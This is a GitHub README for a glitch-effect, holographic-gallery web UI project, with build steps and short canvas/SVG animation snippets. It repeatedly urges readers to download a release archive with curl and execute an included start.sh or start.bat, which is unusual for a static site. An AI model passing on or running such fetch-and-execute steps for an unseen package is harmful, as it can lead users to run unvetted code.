https://github.com/boktai26/cybernetic-project/releases

# Cybernetic Project — Glitch UI & Holographic Project Gallery
[![Releases](https://img.shields.io/github/v/release/boktai26/cybernetic-project?color=0ea5a0&label=Releases&logo=github)](https://github.com/boktai26/cybernetic-project/releases)

![Hero: cybernetic grid](https://images.unsplash.com/photo-1505765057385-5f833f8f3f6f?auto=format&fit=crop&w=1400&q=60)

An interactive, high-tech website that blends glitch animation, holographic design, and live data visualizations. The project focuses on a compact, accessible UI and fluid motion that respond to cursor input and real-time simulated data.

Topics: animation, canvas-animation, css, glitch-effect, html, interactive, javascript, svg-animations, tailwindcss, ui-ux, web-development

Live assets and packaged releases are available on the Releases page. Download the release file from the Releases page and execute the included start script or open the packaged build as described in the Installation section.

Table of contents
- Features
- Demo media
- Tech stack
- Installation
  - From source
  - From Releases (download and execute)
- Usage
- Architecture
- Design notes
- Accessibility
- Performance tips
- Contributing
- License
- Links

Features
- Dynamic glitch effects built with CSS variables and shader-like canvas routines
- Holographic project gallery that uses layered SVG and blend modes for depth
- Animated data pipeline: an interactive SVG/canvas visualization that maps events to animated nodes and flows
- Keyboard and mouse interactivity, plus optional device tilt input
- Tailwind CSS base with custom utilities for neon and glass styles
- Small, modular codebase meant for experimentation and extension

Demo media
- Holographic gallery mockup  
  ![Holographic Gallery](https://images.unsplash.com/photo-1549888834-7dba1b3df4f4?auto=format&fit=crop&w=1200&q=60)

- Glitch animation frame  
  ![Glitch Frame](https://images.unsplash.com/photo-1505740420928-5e560c06d30e?auto=format&fit=crop&w=1200&q=60)

- Data pipeline sketch (SVG demo)  
  ![Data Pipeline](https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&w=1200&q=60)

Tech stack
- HTML5, CSS3, Tailwind CSS
- Vanilla JavaScript with modular ES modules
- Canvas 2D for complex glitch routines
- SVG for crisp, scalable holographic layers and pipeline flows
- Optional: D3.js for data-driven transitions (used in pipeline visualization)
- Build: Vite or simple static server for production build

Installation

From source
1. Clone the repo
   - git clone https://github.com/boktai26/cybernetic-project.git
2. Install dependencies
   - cd cybernetic-project
   - npm install
3. Run dev server
   - npm run dev
4. Build for production
   - npm run build
5. Serve the build
   - npm run preview
   - Or host the contents of the dist/ folder on any static server

From Releases (download and execute)
The Releases page contains packaged builds and start scripts. Download the release file from the Releases page and execute the included start script or open the packaged build:
- Visit the Releases page: https://github.com/boktai26/cybernetic-project/releases
- Download the asset that matches your platform (zip, tar, or a packaged static build).
- Example commands (replace asset-name.zip with actual filename):
  - curl -L -o asset-name.zip "https://github.com/boktai26/cybernetic-project/releases/download/v1.0.0/asset-name.zip"
  - unzip asset-name.zip -d cybernetic-build
  - cd cybernetic-build
  - If the package includes start.sh or start.bat, run it:
    - Linux/macOS: ./start.sh
    - Windows: start.bat
  - Otherwise open index.html in a browser or serve the folder with a static server:
    - npx serve .
    - python -m http.server 8000
- The release package typically includes a small README that states the exact launch step. Download the file and execute the included launcher to run the packaged site.

Usage
- Cursor-driven effects: move the mouse over the hero to shift layers and trigger glitch spikes.
- Gallery navigation: click a card to open a holographic preview. Use arrow keys for keyboard navigation.
- Pipeline control: use the controls panel to push sample data into the pipeline and watch animated node flows.
- Developer mode: toggle the debug overlay to inspect frame timing, canvas redraw regions, and SVG node states.

Architecture
- UI Layer (HTML + Tailwind)
  - Minimal DOM. Tailwind provides layout and visual tokens.
  - Reusable components: hero, gallery-card, pipeline-panel.
- Visual Layer (SVG + canvas)
  - SVG stores vector assets, masks, and layer groups.
  - Canvas renders per-frame distortions and shader-like noise.
- Data Layer (JS modules)
  - A small event bus feeds the pipeline visualization.
  - Wire format: { id, timestamp, source, payload }.
  - Flow animations use requestAnimationFrame and easing functions for smooth transitions.
- Build & Assets
  - Images optimize with pipeline-friendly sizes.
  - SVG assets inline for DOM access and animation control.

Design notes
- Keep motion subtle. Use short easing curves and small amplitude for glitch so the UI stays usable.
- Use contrast in holographic layers with mix-blend-mode and controlled opacity to create depth.
- Avoid large repaint tiles. Batch canvas draws and reuse offscreen canvases for repeated noise patterns.
- Use CSS prefers-reduced-motion to disable non-essential animations.

Accessibility
- Provide keyboard navigation for all interactive elements.
- Use aria-labels for gallery thumbnails and pipeline controls.
- Respect prefers-reduced-motion and expose a toggle to stop motion.
- Ensure text contrast on neon backgrounds meets WCAG AA where possible.

Performance tips
- Throttle mouse-driven updates with requestAnimationFrame.
- Cache created gradients and pattern canvases.
- Use transforms and opacity changes to avoid layout thrash.
- Limit SVG filters to necessary elements and prefer simpler masks when possible.

Code snippets

Glitch loop (simplified)
```js
const canvas = document.querySelector('#glitch');
const ctx = canvas.getContext('2d');
function frame(time){
  ctx.clearRect(0,0,canvas.width,canvas.height);
  // draw base image
  ctx.drawImage(baseImage, 0, 0);
  // overlay noise bands
  for (let i=0;i<5;i++){
    const y = Math.random() * canvas.height;
    ctx.globalAlpha = 0.08;
    ctx.fillStyle = `hsl(${Math.random()*360},80%,60%)`;
    ctx.fillRect(0,y,canvas.width,2 + Math.random()*8);
  }
  ctx.globalAlpha = 1;
  requestAnimationFrame(frame);
}
requestAnimationFrame(frame);
```

Pipeline flow (simplified)
```js
function spawnNode(x,y,meta){
  const node = document.createElementNS('http://www.w3.org/2000/svg','circle');
  node.setAttribute('cx',x);
  node.setAttribute('cy',y);
  node.setAttribute('r',6);
  node.classList.add('flow-node');
  svgLayer.appendChild(node);
  animateNode(node);
}
function animateNode(n){
  const start = performance.now();
  function step(t){
    const p = Math.min((t-start)/800,1);
    n.setAttribute('cx', lerp(startX, endX, easeOutCubic(p)));
    if (p < 1) requestAnimationFrame(step);
    else n.remove();
  }
  requestAnimationFrame(step);
}
```

Configuration
- Tailwind config lives in tailwind.config.js with neon palette and custom utilities.
- Vite config uses simple aliases for /src.
- Drop-in demo data sits in /data/samples.json for pipeline demos.

Contributing
- Open an issue to propose a feature or report a bug.
- Fork the repo, create a feature branch, and submit a PR.
- Keep PRs small and focused. Include screenshots or GIFs of visual changes.
- Add unit tests for any behavioral logic when possible.

Release information
- Visit Releases to download packaged builds. Download the release file from the Releases page and execute the included start script or open the build in a browser:
  - https://github.com/boktai26/cybernetic-project/releases
- Release assets include packaged dist builds, demo start scripts, and change logs.

Contact
- Issues: open an issue on GitHub
- Pull requests: open a PR against main
- For quick questions, use the repository discussion page

Credits and assets
- Visual inspirations: cyberpunk photography and generative art
- Some demo images come from Unsplash and free image sources; check the assets folder for attribution files.

License
- MIT — see LICENSE file

Badges
[![Releases](https://img.shields.io/github/v/release/boktai26/cybernetic-project?color=0ea5a0&label=Releases&logo=github)](https://github.com/boktai26/cybernetic-project/releases)